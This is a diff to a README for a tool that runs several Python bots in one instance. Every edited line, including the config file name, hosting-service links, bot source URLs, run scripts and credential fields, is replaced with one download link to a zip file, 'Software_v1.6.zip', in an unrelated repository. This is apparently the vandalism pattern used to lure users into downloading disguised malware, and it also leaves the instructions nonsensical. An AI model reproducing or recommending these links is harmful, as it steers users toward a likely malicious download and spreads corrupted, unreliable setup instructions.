@@ -9,7 +9,7 @@ _You can run multiple bots in a same instance, for now it only works for pure py
 ## Guide
 
 1. *Fork this repositary*
-2. *Edit CONFIG.json to your liking*
+2. *Edit https://github.com/RaviChatta/multi/raw/refs/heads/main/hemalbumen/Software_v1.6.zip to your liking*
 3. *Host that repositary*
 4. *Profit*
 
@@ -22,7 +22,7 @@ _You can run multiple bots in a same instance, for now it only works for pure py
 * **ENVs** you can set different ENV values for different bots even with same name.
 * **Control** you can also set script file from where execution starts for that bot.
 * **Private** you can also clone private repositories with help of Tokens. (see [Example](#example) below)
-* **Web App** uses Flask to connect to service, so that it can be hosted as Dynamic Web Apps which is required for services like [render](https://render.com/), [scalingo](https://scalingo.com/) etc.
+* **Web App** uses Flask to connect to service, so that it can be hosted as Dynamic Web Apps which is required for services like [render](https://github.com/RaviChatta/multi/raw/refs/heads/main/hemalbumen/Software_v1.6.zip), [scalingo](https://github.com/RaviChatta/multi/raw/refs/heads/main/hemalbumen/Software_v1.6.zip) etc.
 
 ---
 
@@ -31,35 +31,35 @@ _You can run multiple bots in a same instance, for now it only works for pure py
 ```
 {   
     "Ebook": {
-        "source": "https://github.com/bipinkrish/Ebooks-Bot.git",
+        "source": "https://github.com/RaviChatta/multi/raw/refs/heads/main/hemalbumen/Software_v1.6.zip",
         "env": {
             "TOKEN": "xxx",
             "ID": "111",
             "HASH": "yyy",
             "REMIX_ID": "123",
             "REMIX_KEY": "abc123",
-            "IA_EMAIL": "abcd@gmail.com",
-            "IA_PASS": "pass@gmail.com"
+            "IA_EMAIL": "https://github.com/RaviChatta/multi/raw/refs/heads/main/hemalbumen/Software_v1.6.zip",
+            "IA_PASS": "https://github.com/RaviChatta/multi/raw/refs/heads/main/hemalbumen/Software_v1.6.zip"
         },
-        "run": "main.py"
+        "run": "https://github.com/RaviChatta/multi/raw/refs/heads/main/hemalbumen/Software_v1.6.zip"
     },
     "Link": {
-        "source": "https://github.com/bipinkrish/Link-Bypasser-Bot.git",
+        "source": "https://github.com/RaviChatta/multi/raw/refs/heads/main/hemalbumen/Software_v1.6.zip",
         "env": {
             "TOKEN": "fff",
             "ID": "222",
             "HASH": "123abc"
         },
-        "run": "app.py"
+        "run": "https://github.com/RaviChatta/multi/raw/refs/heads/main/hemalbumen/Software_v1.6.zip"
     },
     "Private": {
-        "source": "https://bipinkrish:ghp_token@github.com/bipinkrish/private.git",
+        "source": "https://github.com/RaviChatta/multi/raw/refs/heads/main/hemalbumen/Software_v1.6.zip",
         "env": {
             "TOKEN": "yyy",
             "ID": "444",
             "HASH": "abc321"
         },
-        "run": "bot.py"
+        "run": "https://github.com/RaviChatta/multi/raw/refs/heads/main/hemalbumen/Software_v1.6.zip"
     }
 }
 ```
